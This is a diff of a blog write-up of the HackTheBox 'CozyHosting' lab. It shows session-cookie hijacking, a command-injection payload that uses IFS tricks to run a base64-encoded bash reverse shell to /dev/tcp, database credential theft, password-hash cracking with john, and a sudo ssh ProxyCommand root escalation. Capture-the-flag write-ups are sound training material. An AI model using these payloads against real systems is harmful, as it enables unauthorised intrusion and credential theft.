@@ -14,118 +14,122 @@ HackTheBox: Easy
 > 
 
 ## 1: Enumeration
-
+<br/><br/>
 - Check the active connection
-
+<br/><br/>
 ![Untitled]({{ '/assets/images/cozyhosting/Untitled.png' | relative_url }})
-
+<br/><br/>
 - Scanning ports
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%201.png)
-
+<br/><br/>
 We can see there’s a web services running in 80 port and ssh service in 22 port it could be a way to get in later.
-
+<br/><br/>
 - Dirsearch looking for enable directories
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%202.png)
-
+<br/><br/>
 Something interesting in /actuator/sessions
-
+<br/><br/>
 ## 2: Looking around
-
+<br/><br/>
 - There is a possible cookie hijacking vulnerability.
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%203.png)
-
+<br/><br/>
 - We can use BurpSuite
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%204.png)
-
+<br/><br/>
 - We simulate the log in process and inject the cookie, we change it at the right side bar
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%205.png)
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%206.png)
-
+<br/><br/>
 ## 3: User flag
-
+<br/><br/>
 - It executes commands, so get can make a rev shell to get access
-
+<br/><br/>
 ```bash
 echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
 ```
-
+<br/><br/>
 ```bash
 ;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
 ```
-
+<br/><br/>
 ${IFS%??} For blank spaces and convert it to url format
-
+<br/><br/>
 - We use nc to receive the connection and make the shell stable like this
-
+<br/><br/>
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 ctrl + z
 stty raw -echo; fg
 ```
-
+<br/><br/>
 We use cat etc/passwd for user
-
+<br/><br/>
 - We’ve got and .jar with db credentials, using python
-
+<br/><br/>
 ```bash
 python3 -m http.server 7777
 ```
-
+<br/><br/>
 ```bash
 wget http://10.10.00.000:7777/<file_name>
 ```
-
+<br/><br/>
 - Look for creds:
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%207.png)
-
+<br/><br/>
 ```bash
 psql -h 127.0.0.1 -U postgres
 ```
-
+<br/><br/>
 ```bash
 \c cozyhosting
 ```
-
+<br/><br/>
 ```bash
 \d
 select * from users;
 ```
-
+<br/><br/>
 We got the hash for admin, we solve using
-
+<br/><br/>
 ```bash
 john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
-
+<br/><br/>
 We use ssh to break into
-
+<br/><br/>
 ```bash
 ssh josh@10.10.11.230
 ```
-
+<br/><br/>
 ## 4: Priv esc
-
+<br/><br/>
 - Using sudo -l
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%208.png)
-
+<br/><br/>
 - In [https://gtfobins.github.io/gtfobins/ssh/#sudo](https://gtfobins.github.io/gtfobins/ssh/#sudo) We find a way to get root access easily
-
+<br/><br/>
 ```bash
 sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
 ```
-
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%209.png)
-
+<br/><br/>
 - Machine pwned
+<br/><br/>
 ![Untitled](/assets/images/cozyhosting/Untitled%2010.png)
 
 <script src="{{ '/assets/js/matrix-overlay.js' | relative_url }}"></script>
+
+
+<link rel="stylesheet" href="{{ '/assets/css/imagesstyle.css' | relative_url }}">
